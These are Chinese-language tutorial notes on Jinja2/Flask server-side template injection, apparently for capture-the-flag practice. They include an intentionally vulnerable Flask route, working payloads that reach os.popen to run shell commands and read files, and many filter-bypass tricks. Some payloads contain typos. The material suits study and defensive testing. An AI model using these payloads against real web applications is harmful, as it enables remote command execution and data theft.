## 分隔符

```
{{}}:直接输出表达式的内容，{{2*4}}会输出8

{%%}:用于执行一些控制语句

{##}:用于注释模板文件的内容,其中包含的内容不会在页面输出
```

## 控制语句
图片: https://uploader.shimo.im/f/sY5vUabLNYgWE5Oz.png
## 过滤器
图片: https://uploader.shimo.im/f/U67O1A8HSjhQgBNN.png


## 模板中的全局变量以及函数
图片: https://uploader.shimo.im/f/nd45pMySS4Wg6d31.png

Example
注入源码

```
from flask import Flask
from flask import request
from flask import config
from flask import render_template_string
app = Flask(__name__)
app.config['SECRET_KEY'] = "flag{SSTI_123456}"
@app.route('/')

def hello_world():
    return 'Hello World!'
@app.route('/hello')
def say_hello():
    template = 'Hello {}'.format((request.args.get('name')))
    return render_template_string(template)
if __name__ == '__main__':
    app.run(host='0.0.0.0', debug=True)
    
```
在控制语句中，使用set来定义变量
{%set username = 'admin'%}{{username}}
图片: https://uploader.shimo.im/f/lx1DualHaP9YQFXQ.png
循环
{%for i in range(1,10)%}{%print i%}{%endfor%}
条件
{%if 1==1%}{{"success"}}{%endif%}


## ssti常用属性
```
__class__:用于获取当前对象所对应的类
__base__:返回一个类所直接继承的类
__mro__:返回一个类所继承的所有类
__dict__:返回当前类的函数，全局变量，属性等
__init__:所有类都具有__init__方法，便于利用他作为跳板访问__globals__
__globals__:用于获取function所处空间下使用的moudle，方法以及所有变量
__builtins:获取python内置的方法比如ord,chr等
一个类都继承自Object，所以最终都可以获取到Object类
__class__            类的一个内置属性，表示实例对象的类。
__base__             类型对象的直接基类
__bases__            类型对象的全部基类，以元组形式，类型的实例通常没有属性 __bases__
__mro__              此属性是由类组成的元组，在方法解析期间会基于它来查找基类。
__subclasses__()     返回这个类的子类集合，Each class keeps a list of weak references to its immediate subclasses. This method returns a list of all those references still alive. The list is in definition order.
__init__             初始化类，返回的类型是function
__globals__          使用方式是 函数名.__globals__获取function所处空间下可使用的module、方法以及所有变量。
__dic__              类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在类的__dict__里
__getattribute__()   实例、类、函数都具有的__getattribute__魔术方法。事实上，在实例化的对象进行.操作的时候（形如：a.xxx/a.xxx()），都会自动去调用__getattribute__方法。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性。
__getitem__()        调用字典中的键值，其实就是调用这个魔术方法，比如a['b']，就是a.__getitem__('b')
__builtins__         内建名称空间，内建名称空间有许多名字到对象之间映射，而这些名字其实就是内建函数的名称，对象就是这些内建函数本身。即里面有很多常用的函数。__builtins__与__builtin__的区别就不放了，百度都有。
__import__           动态加载类和函数，也就是导入模块，经常用于导入os模块，__import__('os').popen('ls').read()]
__str__()            返回描写这个对象的字符串，可以理解成就是打印出来。
url_for              flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__['__builtins__']含有current_app。
get_flashed_messages flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__['__builtins__']含有current_app。
lipsum               flask的一个方法，可以用于得到__builtins__，而且lipsum.__globals__含有os模块：{{lipsum.__globals__['os'].popen('ls').read()}}
current_app          应用上下文，一个全局变量。
```
###request的用法
```
request              可以用于获取字符串来绕过，包括下面这些，引用一下羽师傅的。此外，同样可以获取open函数:request.__init__.__globals__['__builtins__'].open('/proc\self\fd/3').read()
request.args.x1   	 get传参
request.values.x1 	 所有参数
request.cookies      cookies参数
request.headers      请求头参数
request.form.x1   	 post传参	(Content-Type:applicaation/x-www-form-urlencoded或multipart/form-data)
request.data  		 post传参	(Content-Type:a/b)
request.json		 post传json  (Content-Type: application/json)
config               当前application的所有配置。此外，也可以这样{{ config.__class__.__init__.__globals__['os'].popen('ls').read() }}
```

## 过滤器
```
int()：将值转换为int类型；

float()：将值转换为float类型；

lower()：将字符串转换为小写；

upper()：将字符串转换为大写；

title()：把值中的每个单词的首字母都转成大写；

capitalize()：把变量值的首字母转成大写，其余字母转小写；

trim()：截取字符串前面和后面的空白字符；

wordcount()：计算一个长字符串中单词的个数；

reverse()：字符串反转；

replace(value,old,new)： 替换将old替换为new的字符串；

truncate(value,length=255,killwords=False)：截取length长度的字符串；

striptags()：删除字符串中所有的HTML标签，如果出现多个空格，将替换成一个空格；

escape()或e：转义字符，会将<、>等符号转义成HTML中的符号。显例：content|escape或content|e。

safe()： 禁用HTML转义，如果开启了全局转义，那么safe过滤器会将变量关掉转义。示例： {{'<em>hello</em>'|safe}}；

list()：将变量列成列表；

string()：将变量转换成字符串；

join()：将一个序列中的参数值拼接成字符串。示例看上面payload；

abs()：返回一个数值的绝对值；

first()：返回一个序列的第一个元素；

last()：返回一个序列的最后一个元素；

format(value,arags,*kwargs)：格式化字符串。比如：{{ "%s" - "%s"|format('Hello?',"Foo!") }}将输出：Helloo? - Foo!

length()：返回一个序列或者字典的长度；

sum()：返回列表内数值的和；

sort()：返回排序后的列表；

default(value,default_value,boolean=false)：如果当前变量没有值，则会使用参数中的值来代替。示例：name|default('xiaotuo')----如果name不存在，则会使用xiaotuo来替代。boolean=False默认是在只有这个变量为undefined的时候才会使用default中的值，如果想使用python的形式判断是否为false，则可以传递boolean=true。也可以使用or来替换。

length()返回字符串的长度，别名是count
```


## 常用方法
__subclasses__:继承此类的子类，返回一个列表
__getattribute__:获取某个类的属性
调试时常用函数
dir:通过dir函数可以获取某个变量可调用的所有属性，函数等。

class A:
    def __init__(self):
        pass
class B(A):
    def __init__(self):
        pass
if __name__ == '__main__':
    b = B()
    print(b.__class__)
    print(b.__class__ == B)
    print(B.__base__)
    print(B.__mro__)



输出:
  <class '__main__.B'>
  True
  <class '__main__.A'>
  (<class '__main__.B'>, <class '__main__.A'>, <class 'object'>)
  

## ssti的一般流程
```
获取某个类 -> 获取到类的基类:Object -> 获取其所有子类 -> 通过获取__globals__来获取os,file或其他能执行命令or读取文件的moudle
随便获取一个类
#python中遵循万物皆对象,所以字符串列表字典等，都是对象。既然是对象，就是基于类创建的。我们可以使用''.__class__来获取到任意一个类

''.__class__
获取到基类Object
#python中的所有类都隐式的继承于基类Object，我们可以通过__base__或__mro__的方式获取到object类，对应上面的payload就是''.__class__.__base__

''.__class__.base__
获取其所有子类
由于object类是所有类的基类,所以我们可以通过__subclasses__()就可以获取到他的所有子类(所有类),对应成上面的payload ''.__class__.__mro__.subclass()
fuzz
查看哪一个类中的全局变量存在os,file等能够执行命令或者读取文件的函数

#payload:{{%27%27.__class__.__base__.__subclasses__()[442].__init__.__globals__['os']}}
```

## 一些绕过过滤的trick
```
{{''.__class__.__base__.__subclasses__()[442].__init__.__globals__['os'].popen("id").read()}}
基于以上payload解释如何绕过
过滤单引号
图片: https://uploader.shimo.im/f/vmJadLIrdfCqAcRB.png
除了字符串还有什么方式获取类
可以用任何类型来读取类:[].__class__ 0.__class__ {}.__class__
变量或函数来获取类:request.__class__ url_for.__class__ g.__class__ session.__class__ config.__class__
全局变量来获取类:dict range lipsum.__class__ joiner cycler namespace
jinja2将不存在变量定义为jinja2.runtime.Undefined，所以我们还可以通过如下方式获取类
不存在的变量名.__class__
如果不使用单引号来传递参数:
1.双引号
2.request
图片: https://uploader.shimo.im/f/7kZFuU37eguLLPUn.png

{{[].__class__.__base__.__subclasses__()[442].__init__.__globals__[request.accept_languages[0][0]].popen(request.accept_encodings[0][ 0]).read()}} 
chr
chr函数传递数字，最终得到的结果是一个字符串
那么在做题时，首先需要fuzz到chr函数
{{().__class__.__bases__[0].__subclasses__()[§0§].__init__.__globals__.__builtins__.chr}}

{%+set+chr=().__class__.__bases__[0].__subclasses__()[109].__init__.__globals__.__builtins__.chr%}{
图片: https://uploader.shimo.im/f/VidUnapOXHpqqeG7.png
过滤点号
中括号:{{''["__class__"]}}
过滤器:{{''|attr("__class__")}}
过滤中括号
图片: https://uploader.shimo.im/f/J1DkZmH2JiBvnc2v.png
列表代替
字典代替
元组代替

可以使用pop来从列表中取值

所以payload可以改为:
{{''.__class__.__base__.__subclasses__().popen(442).__init__.__globals__['os'].popen("ls").read()}}
get
__getitem__()
过滤器
可以使用过滤器的方式获取属性&方法
{''|attr("__class__")}}
元组代替
__getitem__来取值
过滤小括号
过滤了小括号，意味着没有办法执行函数，目前只能通过函数劫持的方法来解决，还没有其他比较好的方法,python函数调用必须使用小括号
过滤花括号
#使用的花括号是jinja的分割符，只有分隔符内的内容才会被当成模板解析，不然会原样输出
{%%}利用漏洞
获取基类:
{%set a=''.__class__.__base__%}{%print a%}
឴获取所有子类
{%set+a=''.__class__.__base__.__subclasses__()%}{%print+a%}
fuzz os module
{%set a=''.__class__.__base__.__subclasses__()[470].__init__.__globals__["os"]%}{%print a%} 
use os module call system command
{%set+a=''.__class__.__base__.__subclasses__()[470].__init__.__globals__["os"].popen("whoami")%}{%print+a.read()%}
图片: https://uploader.shimo.im/f/yRF6QQZdWte93wFR.png
过滤特点关键字

两种方法:过滤器，python语法
过滤器
attr(attr过滤器可以绕过关键字过滤)
图片: https://uploader.shimo.im/f/D8oIxVSiiXzLqgaw.png
format(可以将%s等换成对应内容)
join
图片: https://uploader.shimo.im/f/fgF9ejPbTrxT4oPY.png
图片: https://uploader.shimo.im/f/Lk3R8N2gSaOGNmcL.png
图片: https://uploader.shimo.im/f/yonzLKAJehsRrNBE.png
图片: https://uploader.shimo.im/f/V3HOsr9kHxhxBuNP.png
python语法
图片: https://uploader.shimo.im/f/mEmGkqAu758qLK9y.png
图片: https://uploader.shimo.im/f/uzKFrVe2hKwud8Mq.png
图片: https://uploader.shimo.im/f/SD0sRf5jIrcMNu1U.png
图片: https://uploader.shimo.im/f/BqyIpkbiB1Ajer5l.png
图片: https://uploader.shimo.im/f/UmVuCsUasM802exN.png
fuzz可用继承链

```






